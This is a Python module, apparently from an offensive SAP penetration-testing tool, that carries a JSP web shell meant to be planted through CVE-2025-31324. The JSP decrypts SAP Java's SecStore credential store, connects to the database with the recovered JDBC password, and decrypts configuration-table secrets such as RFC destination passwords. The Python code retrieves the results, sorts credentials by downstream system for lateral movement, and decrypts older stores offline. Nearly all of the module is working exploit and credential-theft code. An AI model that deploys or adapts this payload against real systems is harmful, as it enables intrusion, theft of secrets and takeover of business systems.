#!/usr/bin/env python3
"""
SAP Java Secure Store extraction + decryption.

Uses the target's own `com.sap.security.core.server.secstorefs.SecStoreFS`
class via reflection to decrypt the store, so we don't have to track SAP's
ongoing algorithm changes (3DES → AES-128 → AES-256 by kernel version).
The JSP is dropped through the existing CVE-2025-31324 / GW SAPXPG path.

Names of well-known entries are pattern-matched against downstream ABAP
systems so SAPMAP can auto-populate credentials and draw RFC edges.
"""

from __future__ import annotations

import base64
import logging
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")

# ---------------------------------------------------------------------------
# JSP template: server-side decryption of SecStore.properties
# ---------------------------------------------------------------------------
#
# Usage: GET <jsp_url>?sid=<SID>[&props_path=...&key_path=...]
# Defaults to the canonical Windows path
#   C:\usr\sap\<SID>\SYS\global\security\data\SecStore.{properties,key}
#
# Response format (text/plain):
#   version=<SecStore.key version tag>
#   algorithm=<info string>
#   ### ENTRIES
#   <name>=<base64(utf-8 plaintext)>
#   ...
#   ### END
# On failure, emits
#   status=error
#   error=<class>: <message>
SECSTORE_JSP = r'''<%@ page contentType="text/plain" %>
<%
String sid       = request.getParameter("sid");
String propsPath = request.getParameter("props_path");
String keyPath   = request.getParameter("key_path");
String osSep     = System.getProperty("file.separator");
if (sid == null || sid.length() == 0) {
    out.println("status=error"); out.println("error=missing-sid"); return;
}
sid = sid.toUpperCase();

// Default paths: Unix first (file.separator "/"), Windows fallback.
if (propsPath == null) {
    if ("/".equals(osSep)) {
        propsPath = "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.properties";
    } else {
        propsPath = "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.properties";
    }
}
if (keyPath == null) {
    if ("/".equals(osSep)) {
        keyPath = "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.key";
    } else {
        keyPath = "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.key";
    }
}

try {
    Class<?> SSF = Class.forName("com.sap.security.core.server.secstorefs.SecStoreFS");
    // Static setup: filenames + SID (SID is needed for kernel < 7.00 but
    // setting it is harmless on newer kernels).
    SSF.getMethod("setDefaultFilenames", String.class, String.class)
       .invoke(null, propsPath, keyPath);
    try {
        SSF.getMethod("setSID", String.class).invoke(null, sid);
    } catch (NoSuchMethodException e) { /* older API */ }

    // Construct — SecStoreFS is non-public or has a private ctor in some
    // versions; use reflection to grab whichever is available.
    java.lang.reflect.Constructor<?> ctor = null;
    for (java.lang.reflect.Constructor<?> c : SSF.getDeclaredConstructors()) {
        if (c.getParameterTypes().length == 0) {
            ctor = c; ctor.setAccessible(true); break;
        }
    }
    if (ctor == null) {
        out.println("status=error");
        out.println("error=no-default-constructor");
        return;
    }
    Object inst = ctor.newInstance();

    // Tell the instance where its files live and open it (key is read from
    // the file; no dialog prompt needed on a properly-configured system).
    SSF.getMethod("setFilenames", String.class, String.class)
       .invoke(inst, propsPath, keyPath);
    SSF.getMethod("openExistingStore").invoke(inst);

    // Metadata for the caller: store version + available algorithms.
    try {
        Object ver = SSF.getMethod("getCurrentStoreVersion").invoke(inst);
        out.println("version=" + ver);
    } catch (Throwable t) { /* older API */ }
    try {
        Object info = SSF.getMethod("getDetailedStoreInfo").invoke(inst);
        out.println("algorithm=" + String.valueOf(info));
    } catch (Throwable t) { /* older API */ }

    // Dump decrypted key=value pairs.  getStringPairs() returns java.util.Properties.
    java.util.Properties pairs = (java.util.Properties)
        SSF.getMethod("getStringPairs").invoke(inst);
    out.println("### FILE_ENTRIES");
    String jdbcPoolValue = null;
    for (String name : pairs.stringPropertyNames()) {
        String value = pairs.getProperty(name);
        byte[] vb = (value == null) ? new byte[0] : value.getBytes("UTF-8");
        String b64 = java.util.Base64.getEncoder().encodeToString(vb);
        out.println(name + "=" + b64);
        if (name.toLowerCase().startsWith("jdbc/pool/")) {
            jdbcPoolValue = value;
        }
    }

    // === J2EE_CONFIGENTRY dump (phase 2) ===
    // Caller can disable by passing include_configentry=0.
    String inclCE = request.getParameter("include_configentry");
    boolean doCE = (inclCE == null || !"0".equals(inclCE));

    if (doCE && jdbcPoolValue != null) {
        out.println("### CONFIG_ENTRIES");
        String cleaned = jdbcPoolValue.replace("\\", "");
        // Parse the inner JDBC URL + driver class + user/password
        java.util.regex.Matcher mDrv = java.util.regex.Pattern
            .compile("ClassName\\s*=\\s*([A-Za-z0-9_.]+)")
            .matcher(cleaned);
        String drvClass = mDrv.find() ? mDrv.group(1) : null;
        java.util.regex.Matcher mUrl = java.util.regex.Pattern
            .compile("Url\\s*=\\s*(jdbc:[^&;]+)")
            .matcher(cleaned);
        String url = mUrl.find() ? mUrl.group(1).trim() : null;
        java.util.regex.Matcher mUser = java.util.regex.Pattern
            .compile("[?&;]User\\s*=\\s*([^&;]+)", java.util.regex.Pattern.CASE_INSENSITIVE)
            .matcher(cleaned);
        String dbUser = mUser.find() ? mUser.group(1).trim() : null;
        java.util.regex.Matcher mPwd = java.util.regex.Pattern
            .compile("[?&;]Password\\s*=\\s*([^&;]*)", java.util.regex.Pattern.CASE_INSENSITIVE)
            .matcher(cleaned);
        String dbPwd = mPwd.find() ? mPwd.group(1).trim() : "";

        out.println("# jdbc_driver=" + drvClass);
        out.println("# jdbc_url=" + url);
        out.println("# jdbc_user=" + dbUser);

        java.sql.Connection conn = null;
        try {
            if (drvClass != null) {
                Class.forName(drvClass);
            }
            if (url == null || dbUser == null) {
                out.println("# configentry_error=JDBC URL or user missing");
            } else {
                conn = java.sql.DriverManager.getConnection(url, dbUser, dbPwd);
                // NAME LIKE '##%' rows are framework metadata (version,
                // descriptions, content-class markers) — they're stored
                // raw, not SecStoreFS-encrypted, so we filter them out.
                java.sql.PreparedStatement ps = conn.prepareStatement(
                    "SELECT CID, NAME, VBYTES FROM J2EE_CONFIGENTRY "
                    + "WHERE VBYTES IS NOT NULL "
                    + "AND NAME NOT LIKE '##%'");
                java.sql.ResultSet rs = ps.executeQuery();
                java.lang.reflect.Method decryptM =
                    SSF.getMethod("decrypt", byte[].class);
                int count = 0, okCount = 0;
                while (rs.next()) {
                    count++;
                    String cid  = rs.getString("CID");
                    String name = rs.getString("NAME");
                    byte[] blob = rs.getBytes("VBYTES");
                    if (blob == null || blob.length == 0) continue;
                    // The MaxDB JDBC driver returns the full BLOB allocation
                    // (often 2000 bytes) with trailing NUL padding.  SecStoreFS
                    // chokes on the padded length with IllegalBlockSizeException
                    // — trim to the last non-zero byte before decrypting.
                    int last = blob.length - 1;
                    while (last >= 0 && blob[last] == 0) last--;
                    if (last < 0) continue;
                    int realLen = last + 1;
                    if (realLen != blob.length) {
                        byte[] tr = new byte[realLen];
                        System.arraycopy(blob, 0, tr, 0, realLen);
                        blob = tr;
                    }
                    try {
                        byte[] pt = (byte[]) decryptM.invoke(inst, (Object) blob);
                        // Plaintext layout: 2-byte big-endian length prefix
                        // followed by `length` bytes of UTF-8 content.
                        // (Earlier code used a 4-byte prefix — wrong; that
                        // surfaced "<Password>" prefixed by 00 0a control
                        // bytes which rendered as boxes in the GUI.)
                        if (pt != null && pt.length >= 2) {
                            int declared = ((pt[0] & 0xff) << 8)
                                          |  (pt[1] & 0xff);
                            if (declared >= 0 && declared <= pt.length - 2) {
                                byte[] trimmed = new byte[declared];
                                System.arraycopy(pt, 2, trimmed, 0, declared);
                                pt = trimmed;
                            }
                        }
                        String plain = (pt == null) ? ""
                            : new String(pt, "UTF-8");
                        String b64 = java.util.Base64.getEncoder()
                            .encodeToString(plain.getBytes("UTF-8"));
                        out.println(cid + "::" + name + "=" + b64);
                        okCount++;
                    } catch (Throwable dt) {
                        // Many rows in J2EE_CONFIGENTRY aren't SecStoreFS-
                        // encrypted (different services use the column for
                        // their own opaque blobs, e.g. WS-RM sequence state,
                        // PSE storage).  These throw InvalidStateException
                        // — surface as comments so users see what's being
                        // skipped without polluting the entries list.
                        Throwable rc = dt;
                        while (rc.getCause() != null) rc = rc.getCause();
                        out.println("# skipped cid=" + cid
                            + " name=" + name + " reason="
                            + rc.getClass().getSimpleName());
                    }
                }
                rs.close(); ps.close();
                out.println("# configentry_total=" + count
                    + " decrypted=" + okCount);

                // Pull the cleartext metadata that lives in VSTR (not VBYTES)
                // for every destination CID — needed so the GUI can show
                // "this #~jco.client.passwd belongs to destination to_S4H,
                // user joris, target S4H" instead of identical anonymous rows.
                //
                // Broad CID set: any CID that has *any* #~jco.client.* VSTR
                // row (user, ashost, client, r3name, sysnr, ...).  The old
                // query restricted to CIDs with #~destination.name which
                // excluded system destinations like UMEBackendConnection
                // where the name is stored under a different key — those
                // appeared as anonymous #~jco.client.passwd rows.
                java.sql.PreparedStatement ps2 = conn.prepareStatement(
                    "SELECT CID, NAME, VSTR FROM J2EE_CONFIGENTRY "
                    + "WHERE NAME LIKE '#~%' AND VSTR IS NOT NULL "
                    + "AND VSTR <> '' AND CID IN ("
                    + "  SELECT DISTINCT CID FROM J2EE_CONFIGENTRY "
                    + "  WHERE (NAME = '#~destination.name' "
                    + "         OR NAME LIKE '#~jco.client.%' "
                    + "         OR NAME LIKE '#~destination.%') "
                    + "  AND VSTR IS NOT NULL AND VSTR <> ''"
                    + ")");
                java.sql.ResultSet rs2 = ps2.executeQuery();
                int ctxCount = 0;
                while (rs2.next()) {
                    String c2  = rs2.getString("CID");
                    String n2  = rs2.getString("NAME");
                    String v2  = rs2.getString("VSTR");
                    if (v2 == null) continue;
                    out.println("CTX " + c2 + "::" + n2 + "="
                        + java.util.Base64.getEncoder()
                            .encodeToString(v2.getBytes("UTF-8")));
                    ctxCount++;
                }
                rs2.close(); ps2.close();
                out.println("# context_rows=" + ctxCount);
            }
        } catch (Throwable cet) {
            Throwable cec = cet;
            while (cec.getCause() != null) cec = cec.getCause();
            out.println("# configentry_error=" + cec.getClass().getSimpleName()
                + ": " + cec.getMessage());
        } finally {
            if (conn != null) try { conn.close(); } catch (Exception ex) {}
        }
    }

    out.println("### END");
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
    java.io.StringWriter sw = new java.io.StringWriter();
    c.printStackTrace(new java.io.PrintWriter(sw));
    out.println("trace=" + java.util.Base64.getEncoder()
        .encodeToString(sw.toString().getBytes("UTF-8")));
}
%>'''


# ---------------------------------------------------------------------------
# JSP invoker
# ---------------------------------------------------------------------------

def invoke_secstore_jsp(jsp_url: str, sid: str,
                         props_path: str = "", key_path: str = "",
                         timeout: float = 30.0) -> dict:
    """Call the deployed secure-store JSP and parse the response.

    Returns dict:
        success    : bool
        version    : store version byte (str if reported)
        algorithm  : summary info string
        entries    : list[{name, value}] of decrypted pairs
        error      : str (on failure)
        raw        : str (the full JSP body — useful for debugging)
    """
    params = {"sid": sid}
    if props_path:
        params["props_path"] = props_path
    if key_path:
        params["key_path"] = key_path
    url = f"{jsp_url}?{urllib.parse.urlencode(params)}"
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})

    result = {"success": False, "version": "", "algorithm": "",
              "entries": [], "config_entries": [],
              # configentry_context[cid] = {prop_name: value} for every
              # cleartext (#~%) row under JCo destination CIDs.  Lets the
              # caller annotate each row with its destination/user/target
              # context.
              "configentry_context": {},
              # failed_decrypts = [{cid, name, reason}, ...] — rows whose
              # VBYTES couldn't be decrypted with SecStoreFS.  Typically
              # means the row is encrypted with a different key (VSI /
              # Vault / per-instance PSE) rather than the SecStoreFS
              # master.  Exposed so the operator can see what's hiding.
              "failed_decrypts": [],
              "jdbc_meta": {}, "error": "", "raw": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["raw"] = text[:1000]
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    section = None    # None | "file" | "config"
    for line in text.splitlines():
        if line == "### FILE_ENTRIES" or line == "### ENTRIES":
            section = "file"; continue
        if line == "### CONFIG_ENTRIES":
            section = "config"; continue
        if line == "### END":
            section = None
            result["success"] = True
            continue
        if section is None:
            if line.startswith("version="):
                result["version"] = line[len("version="):]
            elif line.startswith("algorithm="):
                result["algorithm"] = line[len("algorithm="):]
            elif line.startswith("status=error"):
                result["error"] = "server-side"
            elif line.startswith("error="):
                result["error"] = (result.get("error") + " / " if result["error"]
                                    else "") + line[len("error="):]
            continue
        # CTX lines (cleartext metadata for JCo destination CIDs) come
        # interleaved at the end of the CONFIG_ENTRIES block.
        if line.startswith("CTX "):
            rest = line[4:]
            if "::" not in rest or "=" not in rest:
                continue
            cid_part, _, kv = rest.partition("::")
            name_part, _, b64val = kv.partition("=")
            try:
                pv = base64.b64decode(b64val).decode("utf-8", errors="replace")
            except Exception:
                pv = ""
            result["configentry_context"].setdefault(cid_part, {})[name_part] = pv
            continue
        # Inside a section.  Lines starting with "#" are metadata/diagnostics,
        # not entries.
        if line.startswith("#"):
            if section == "config":
                stripped = line.lstrip("# ").strip()
                # "# skipped cid=X name=Y reason=Z" — decrypt failed
                if stripped.startswith("skipped cid="):
                    import re as _re
                    m = _re.match(r"skipped cid=(\S+) name=(.+?) reason=(\S+)",
                                    stripped)
                    if m:
                        result["failed_decrypts"].append({
                            "cid": m.group(1),
                            "name": m.group(2).strip(),
                            "reason": m.group(3),
                        })
                    continue
                # parse "# jdbc_driver=..." etc. for the jdbc_meta dict
                if "=" in stripped:
                    k, v = stripped.split("=", 1)
                    result["jdbc_meta"][k] = v
            continue
        if "=" not in line:
            continue
        name, b64val = line.split("=", 1)
        try:
            plain = base64.b64decode(b64val).decode("utf-8", errors="replace")
        except Exception:
            plain = ""
        if section == "config":
            # config-entry rows encode name as "<CID>::<NAME>"
            if "::" in name:
                cid, ename = name.split("::", 1)
            else:
                cid, ename = "", name
            result["config_entries"].append(
                {"cid": cid, "name": ename, "value": plain})
        else:
            result["entries"].append({"name": name, "value": plain})
    return result


# ---------------------------------------------------------------------------
# Downstream-target parsing
# ---------------------------------------------------------------------------

# SAP UME / NWAS convention names seen across kernels.  The patterns below
# map entry names to (kind, captured-target-SID, captured-client).  "kind"
# is a short tag used in the GUI / logs.
_DOWNSTREAM_PATTERNS = [
    # SAPJSF/<SID>/<client>  -- the classic "JCo technical user" entry
    (re.compile(r"^SAPJSF[/_](?P<sid>[A-Z0-9]{3})(?:[/_](?P<client>\d{3}))?$",
                re.IGNORECASE),
     "sapjsf"),
    # jco/<dest_name>/... or <sid>/jco/<dest>  -- named RFC destination
    (re.compile(r"^(?:jco[/_])?(?P<sid>[A-Z0-9]{3})[/_]jco[/_].*",
                re.IGNORECASE),
     "jco_dest"),
    # jdbc/pool/<SID>  -- database password on THIS node
    (re.compile(r"^jdbc[/_]pool[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "jdbc_local"),
    # sapj2ee/<SID>  -- local Java runtime admin
    (re.compile(r"^sapj2ee[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "sapj2ee_local"),
    # admin/<SID>  -- legacy
    (re.compile(r"^admin[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "admin_local"),
]


def classify_entry(name: str, source_sid: str) -> dict:
    """Classify a SecStore entry name.  Returns dict:
        kind       : "sapjsf"|"jdbc_local"|"jco_dest"|... or "unknown"
        target_sid : downstream SID if applicable, else ""
        client     : downstream ABAP client if applicable (3-digit), else ""
        is_local   : True if the credential targets this node itself
        is_downstream : True if it targets a DIFFERENT ABAP system
    """
    for rx, kind in _DOWNSTREAM_PATTERNS:
        m = rx.match(name)
        if not m:
            continue
        tgt = (m.groupdict().get("sid") or "").upper()
        client = m.groupdict().get("client") or ""
        is_local = bool(tgt) and tgt.upper() == source_sid.upper()
        is_downstream = bool(tgt) and not is_local and kind in ("sapjsf", "jco_dest")
        return {
            "kind": kind,
            "target_sid": tgt,
            "client": client,
            "is_local": is_local,
            "is_downstream": is_downstream,
        }
    return {"kind": "unknown", "target_sid": "", "client": "",
            "is_local": False, "is_downstream": False}


# ---------------------------------------------------------------------------
# Offline Python decryptor (ERPScan 3DES-era fallback)
# ---------------------------------------------------------------------------

# 20-byte XOR constant from ERPScan's SecStoreDec.  Only used when the key
# file's version marker indicates the 3DES-era algorithm.  Newer AES-era
# stores must be decrypted server-side via the JSP.
_XOR_CONSTANT = bytes([
    0x2b, 0xb6, 0x8f, 0xfa, 0x96, 0xec, 0xb6, 0x10,
    0x24, 0x47, 0x92, 0x65, 0x17, 0xb0, 0x09, 0xc4,
    0x3e, 0x0a, 0xd7, 0xbd,
])


def extract_keyphrase(key_bytes: bytes) -> tuple:
    """Parse SecStore.key, XOR-deobfuscate the keyphrase.

    Returns (version_string, keyphrase_bytes).  Raises ValueError for
    unparseable input.
    """
    text = key_bytes.decode("latin1", errors="replace")
    m = re.search(r"(\d\.\d{2}\.\d{3})\.\d{3}", text)
    version = m.group(1) if m else ""
    # ERPScan's tool uses a second group in the same regex for the obfuscated
    # keyphrase — in practice the bytes after the version marker form the
    # obfuscated payload.  This function is best-effort for 3DES-era stores.
    if m:
        tail = text[m.end():]
    else:
        tail = text
    # XOR the first len(_XOR_CONSTANT) bytes with the constant
    raw = tail.encode("latin1")[:len(_XOR_CONSTANT)]
    if len(raw) < len(_XOR_CONSTANT):
        raise ValueError(f"key tail too short ({len(raw)}B)")
    keyphrase = bytes(a ^ b for a, b in zip(raw, _XOR_CONSTANT))
    return version, keyphrase


# ---------------------------------------------------------------------------
# Version-based algorithm router
# ---------------------------------------------------------------------------

# Reported algorithm mapping by SecStore.key version prefix (from SAP wiki
# summaries of Note 3153525 "Improvement of SecureStoreFS encryption
# algorithms").  Used to pick a decryption path for offline mode.
_ALGORITHM_BY_VERSION = [
    (re.compile(r"^7\.00\."),    "3DES"),
    (re.compile(r"^7\.50\.000\.004"), "AES128"),
    (re.compile(r"^7\.50\.000\.005"), "AES256"),
]


def detect_algorithm(version: str) -> str:
    """Return "3DES" | "AES128" | "AES256" | "unknown" based on version tag."""
    for rx, alg in _ALGORITHM_BY_VERSION:
        if rx.match(version or ""):
            return alg
    return "unknown"


def decrypt_files_offline(properties_text: str, key_bytes: bytes,
                            sid: str = "") -> dict:
    """Offline Python decryption for files-only scenarios (no JSP access).

    Currently only the 3DES-era algorithm is implemented — it matches the
    ERPScan recipe:

        digest = PBE-SHA1(keyphrase + [SID if version < 7.00])
        salt   = 16 zero bytes
        iters  = 0
        cipher = 3DES/CBC

    For AES-era (7.50.000.004 and newer) stores the key-derivation details
    are not publicly documented; when we encounter one we return a helpful
    error directing the caller to use the JSP (server-side) path instead.

    Returns dict {success, version, algorithm, entries, error}.
    """
    result = {"success": False, "version": "", "algorithm": "",
              "entries": {}, "error": ""}
    try:
        version, keyphrase = extract_keyphrase(key_bytes)
    except Exception as e:
        result["error"] = f"key parse failed: {e}"
        return result
    result["version"] = version
    algorithm = detect_algorithm(version)
    result["algorithm"] = algorithm

    if algorithm in ("AES128", "AES256", "unknown"):
        # We know where the algorithm gate is, but don't have a test sample
        # to reverse the AES key-derivation parameters (PBKDF2 iters + salt
        # layout would need to be lifted from the SAP class bytecode on a
        # real target).  Fail with a clear actionable message so the caller
        # falls back to the JSP-driven path that uses the server's own
        # SecStoreFS implementation.
        result["error"] = (
            f"offline decrypt for {algorithm} not implemented — "
            f"use the JSP / server-side path "
            f"(sap_java_secstore.invoke_secstore_jsp)")
        return result

    # 3DES path — requires the third-party `pyjks` library for the PBE
    # primitive.  Imported lazily so it's only a runtime requirement when
    # someone actually uses offline mode.
    try:
        import jks.util as _jksu  # type: ignore
    except ImportError:
        result["error"] = ("3DES offline decrypt requires pyjks "
                            "(`pip install pyjks`); or use the JSP path")
        return result

    # Version < 7.00 appends the SID to the keyphrase.
    try:
        major_minor = int(version.split(".")[0] + version.split(".")[1])
    except Exception:
        major_minor = 700
    effective_key = keyphrase
    if major_minor < 700 and sid:
        effective_key = keyphrase + sid.encode("utf-8")
    salt = b"\x00" * 16
    iters = 0

    entries = {}
    for line in properties_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "$internal" in line:
            continue
        if "=" not in line:
            continue
        name, b64 = line.split("=", 1)
        try:
            ct = base64.b64decode(b64)
            pt = _jksu.derive_key_and_iv("sha1", effective_key, salt,
                                           iters, "DES-EDE3-CBC", ct)
            # Strip length prefix if present
            if len(pt) >= 4:
                declared = int.from_bytes(pt[:4], "big")
                if 0 < declared <= len(pt) - 4:
                    pt = pt[4:4 + declared]
            entries[name] = pt.decode("utf-8", errors="replace")
        except Exception as e:
            entries[name] = f"<decrypt error: {e}>"
    result["entries"] = entries
    result["success"] = True
    return result


# ---------------------------------------------------------------------------
# JDBC connection-string parser (extract user/password/host/db from decrypted
# jdbc/pool/<SID> entries).
# ---------------------------------------------------------------------------

_JDBC_DRIVER_TO_DB = {
    # Map SAP JDBC driver class names -> RFCDBSYS-style DB code
    "dbtech.jdbc.driversapdb": "ADA",
    "ngdbc.driver":            "HDB",
    "sqlserver.sqlserverdriver": "MSS",
    "jdbc.sqlserverdriver":    "MSS",
    "oracle.jdbc.oracledriver": "ORA",
    "ibm.db2.jcc.db2driver":   "DB6",
}


def parse_jdbc_entry(value: str) -> dict:
    """Decompose a SAP JDBC pool entry value into host/port/db/user/password.

    Handles the handful of URL layouts SAP emits (MaxDB, HANA, MSSQL,
    Oracle, DB2 — all variations differ only in delimiter quirks).
    Missing fields come back as empty strings.
    """
    out = {"driver": "", "db_type": "", "host": "", "port": "",
           "database": "", "user": "", "password": "", "raw_url": value}
    # Driver class name
    m = re.search(r"ClassName\s*=\s*([A-Za-z0-9_.]+)", value)
    if m:
        out["driver"] = m.group(1)
        low = m.group(1).lower()
        for key, code in _JDBC_DRIVER_TO_DB.items():
            if key in low:
                out["db_type"] = code
                break
    # User / Password (works for every SAP variant since SAP quotes ; and &)
    # Backslash-escape stripping (MaxDB emits \= and \& as literal chars).
    cleaned = value.replace("\\", "")
    m = re.search(r"[?&;]User\s*=\s*([^&;]+)", cleaned, re.IGNORECASE)
    if m: out["user"] = m.group(1).strip()
    m = re.search(r"[?&;]Password\s*=\s*([^&;]*)", cleaned, re.IGNORECASE)
    if m: out["password"] = m.group(1).strip()
    # Host / port / database from the inner JDBC URL
    m = re.search(r"Url\s*=\s*jdbc:([^?]+)", cleaned, re.IGNORECASE)
    inner = m.group(1) if m else ""
    if not inner:
        # Some entries put the inner URL right at the top level
        m = re.search(r"jdbc:([^?&;\s]+)", cleaned, re.IGNORECASE)
        inner = m.group(1) if m else ""
    m = re.match(r"([a-z]+)://([^/:]+)(?::(\d+))?(?:/([^?&;\s]+))?", inner,
                  re.IGNORECASE)
    if m:
        out["host"] = m.group(2) or ""
        out["port"] = m.group(3) or ""
        out["database"] = m.group(4) or ""
    return out
